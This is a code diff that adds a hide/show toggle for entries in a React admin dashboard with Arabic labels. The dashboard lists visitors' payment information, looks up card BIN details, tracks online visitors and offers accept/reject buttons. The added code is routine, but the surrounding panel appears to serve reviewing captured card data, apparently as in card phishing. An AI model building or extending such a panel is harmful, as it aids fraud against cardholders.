@@ -13,7 +13,9 @@ import {
   X,
   ChevronLeft,
   Inbox,
-  Circle
+  Circle,
+  EyeOff,
+  Eye
 } from "lucide-react";
 import {
   subscribeToVisitors,
@@ -174,6 +176,8 @@ export default function AdminDashboard() {
   const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
   const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
   const [loadingBin, setLoadingBin] = useState(false);
+  const [hiddenIds, setHiddenIds] = useState<Set<string>>(new Set());
+  const [showHidden, setShowHidden] = useState(false);
 
   useEffect(() => {
     if (!authLoading && !user) {
@@ -259,7 +263,23 @@ export default function AdminDashboard() {
     };
   });
 
-  const filteredData = combinedData.filter(row => row.paymentInfo);
+  const filteredData = combinedData.filter(row => row.paymentInfo && (showHidden || !hiddenIds.has(row.visitorId)));
+  const hiddenCount = combinedData.filter(row => row.paymentInfo && hiddenIds.has(row.visitorId)).length;
+
+  const handleHideEntry = (visitorId: string) => {
+    setHiddenIds(prev => {
+      const newSet = new Set(prev);
+      if (newSet.has(visitorId)) {
+        newSet.delete(visitorId);
+      } else {
+        newSet.add(visitorId);
+      }
+      return newSet;
+    });
+    if (selectedData?.visitorId === visitorId && !showHidden) {
+      setSelectedData(null);
+    }
+  };
 
   const handleSelectEntry = async (data: CombinedData) => {
     setSelectedData(data);
@@ -302,6 +322,17 @@ export default function AdminDashboard() {
         </div>
         
         <div className="flex items-center gap-2">
+          {hiddenCount > 0 && (
+            <Button
+              onClick={() => setShowHidden(!showHidden)}
+              variant={showHidden ? "default" : "outline"}
+              size="sm"
+              className="text-xs"
+            >
+              <EyeOff className="w-3.5 h-3.5 ml-1" />
+              {showHidden ? `إخفاء (${hiddenCount})` : `المخفية (${hiddenCount})`}
+            </Button>
+          )}
           <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 rounded-full">
             <Circle className="w-2 h-2 fill-green-500 text-green-500" />
             <span className="text-xs font-medium text-green-700">{onlineCount} متصل</span>
@@ -413,6 +444,24 @@ export default function AdminDashboard() {
                     <Button variant="destructive" size="sm">
                       <X className="w-4 h-4 ml-1" />
                       رفض
+                    </Button>
+                    <Button 
+                      variant="outline" 
+                      size="sm"
+                      onClick={() => handleHideEntry(selectedData.visitorId)}
+                      className="text-slate-600"
+                    >
+                      {hiddenIds.has(selectedData.visitorId) ? (
+                        <>
+                          <Eye className="w-4 h-4 ml-1" />
+                          إظهار
+                        </>
+                      ) : (
+                        <>
+                          <EyeOff className="w-4 h-4 ml-1" />
+                          إخفاء
+                        </>
+                      )}
                     </Button>
                   </div>
                 </div>
